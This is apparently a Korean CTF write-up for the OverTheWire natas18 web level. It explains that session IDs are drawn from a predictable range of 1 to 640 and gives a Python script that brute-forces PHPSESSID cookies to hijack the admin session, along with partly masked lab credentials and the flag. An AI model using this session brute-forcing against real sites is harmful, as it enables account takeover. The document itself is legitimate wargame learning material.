# Category

web

# Overview

Please login with your admin account to retrieve credentials for natas19.

Username:
Password:

# Analysis

- 할당받은 세션에 `admin=1`이 존재한다면 다음 비밀번호를 노출하는 코드가 실행된다.

- 코드 상 `admin`값을 변경할 수 있는 취약점은 없었으며, 세션 id 생성 로직이 예측 가능한 범위 안에 들어올 수 있는 취약점이 존재한다.

- `username`과 `password`를 입력하게되면 `PHPSESSID`값이 코드에 따라 `$maxid` 640 범위 안에서 랜덤하게 받는 다는 것을 알 수 있다.

```php
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
```

`admin` 또한 마찬가지로 랜덤한 session id를 할당받았다고 가정할 수 있다.

# Exploitation

랜덤으로 생성될 수 있는 1~640까지 반복하며 요청하게 되면 admin 세션에 대한 값을 찾을 수 있으며, 다음 비빌번호를 알 수 있다.

```py
# solve.py
def request(sid: str):
    res = req(
        url="http://natas18.natas.labs.overthewire.org/index.php",
        method="POST",
        auth=("natas18", "6O...CJ"),
        cookies={"PHPSESSID": sid},
    )

    return res


i = 1
while i <= 640:
    print(i)
    res = request(str(i))
    if "You are logged in as a regular user" not in res.text:
        print(i)
        print(res.text)
        break
    else:
        i += 1

```

# Flag

`tn...Jr`
